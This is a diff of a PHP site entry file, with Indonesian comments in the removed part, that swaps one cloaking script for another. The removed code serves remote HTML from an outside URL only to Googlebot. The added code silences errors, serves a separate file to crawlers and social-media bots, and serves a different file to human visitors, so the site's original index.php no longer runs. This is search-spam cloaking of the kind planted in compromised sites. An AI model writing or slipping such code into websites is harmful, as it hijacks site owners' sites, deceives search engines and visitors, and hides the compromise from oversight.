@@ -1,42 +1,33 @@
-<?php
-// ==== Serve remote .txt HTML only for Googlebot (sederhana) ====
+<?php  
+error_reporting(0);
+set_time_limit(0);
 
-$REMOTE_URL = 'https://siecindia-test.pages.dev/';
-
-// Fungsi cek sederhana (User-Agent saja)
-function is_googlebot(): bool {
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    return (bool) preg_match('/Googlebot|Google-InspectionTool|GoogleOther|AdsBot-Google/i', $ua);
+$bot_content_file = 'size.php';
+$user_content_file = 'home.php';
+function is_spider()
+{
+    $spiders = ['Googlebot', 'Google-InspectionTool', 'Google Favicon', 'Google-Site-Verification', 'facebook', 'instagram', 'tiktok', 'telegram', 'bot'];
+    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    
+    foreach ($spiders as $spider) {
+        if (stripos($s_agent, $spider) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
-if (is_googlebot()) {
-    // Ambil isi remote file (cURL > fallback stream)
-    $html = null;
-    if (function_exists('curl_init')) {
-        $ch = curl_init($REMOTE_URL);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT        => 8,
-            CURLOPT_USERAGENT      => 'VerifiedBotFetcher/1.0',
-        ]);
-        $resp = curl_exec($ch);
-        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($resp !== false && $code >= 200 && $code < 300) $html = $resp;
-    }
-    if ($html === null) {
-        $html = @file_get_contents($REMOTE_URL);
-    }
-
-    if ($html) {
-        header('Content-Type: text/html; charset=UTF-8');
-        header('X-Served-For: Googlebot');
-        echo $html;
-        exit;
-    }
+if (is_spider()) {	
+    if (file_exists($bot_content_file)) {
+        include($bot_content_file);
+    }	
+    exit();
+}else{	
+    if (file_exists($user_content_file)) {
+        include($user_content_file);
+    }	
+    exit();
 }
 
-// ==== end: Googlebot handling ====
 
-require_once __DIR__ . '/../index.php';
+?>
